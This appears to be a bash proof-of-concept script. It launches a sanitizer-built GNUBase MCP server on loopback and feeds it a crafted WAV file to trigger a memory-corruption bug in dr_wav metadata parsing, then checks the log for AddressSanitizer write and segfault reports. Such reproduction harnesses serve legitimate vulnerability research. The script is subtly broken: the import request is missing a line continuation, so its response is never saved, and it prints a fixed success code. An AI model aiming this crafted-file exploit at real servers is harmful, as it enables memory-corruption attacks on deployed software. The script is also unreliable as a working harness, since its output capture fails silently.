#!/usr/bin/env bash
# Start the real GNUBase headless MCP server on loopback, then ask it to
# audioFile.import a crafted 150-byte RIFF. The server calls the pinned
# vulnerable drwav_init_with_metadata(); no harness source is patched.
# Usage: run-gnubase.sh [port] [wav-path]
set -u
HERE=$(cd "$(dirname "$0")" && pwd)
ROOT=$(cd "$HERE/.." && pwd)
SRC="$ROOT/deps/gnubase"
BIN="$SRC/build/asan-clang/bin/gnubase"
OUT="$ROOT/deps/gnubase/crafted"
PORT=${1:-8765}
WAV=${2:-$OUT/bad.wav}
LOG="$OUT/gnubase-http.log"

if [[ ! -x "$BIN" ]]; then echo "missing $BIN" >&2; exit 2; fi
mkdir -p "$OUT"
if [[ "$WAV" == "$OUT/bad.wav" ]]; then
  python3 "$HERE/make_wav.py" "$WAV" 0x41414141 >/dev/null
fi
rm -f "$LOG"
ASAN_OPTIONS=detect_leaks=0:abort_on_error=0 "$BIN" --headless --mcp-http="$PORT" >"$LOG" 2>&1 &
PID=$!
trap 'kill "$PID" 2>/dev/null || true' EXIT
for _ in $(seq 1 150); do
  grep -q '^Access token:' "$LOG" && break
  kill -0 "$PID" 2>/dev/null || break
  sleep 0.2
done
TOKEN=$(sed -n 's/^Access token: //p' "$LOG" | head -1)
if [[ -z "$TOKEN" ]]; then echo "no token; log:" >&2; cat "$LOG" >&2; exit 3; fi
URL="http://127.0.0.1:$PORT/mcp"
HDR=(-H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' -H 'Accept: application/json, text/event-stream')
curl -sS -D "$OUT/initialize.headers" "${HDR[@]}" -X POST "$URL" \
  -d '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2025-06-18","capabilities":{},"clientInfo":{"name":"drwav-probe","version":"1"}}}' \
  >"$OUT/initialize.body"
SESSION=$(sed -n 's/^[Mm]cp-[Ss]ession-[Ii]d: //p' "$OUT/initialize.headers" | tr -d '\r' | head -1)
[[ -n "$SESSION" ]] && HDR+=(-H "Mcp-Session-Id: $SESSION")
curl -sS "${HDR[@]}" -X POST "$URL" -d '{"jsonrpc":"2.0","method":"notifications/initialized"}' >/dev/null
curl -sS -D "$OUT/import.headers" "${HDR[@]}" -X POST "$URL" \
  -d "{\"jsonrpc\":\"2.0\",\"id\":2,\"method\":\"tools/call\",\"params\":{\"name\":\"audioFile_import\",\"arguments\":{\"files\":[\"$WAV\"]}}}"
  >"$OUT/import.body"
sleep 1
echo "PID=$PID LOG=$LOG WAV=$WAV"
grep -n -E 'MCP server|Access token|ERROR: AddressSanitizer|SUMMARY: AddressSanitizer|SEGV|WRITE of size|Address .* is located' "$LOG" || true
echo '--- import.body ---'
cat "$OUT/import.body"
echo
kill "$PID" 2>/dev/null || true
wait "$PID" 2>/dev/null || true
echo SERVER_RC=0
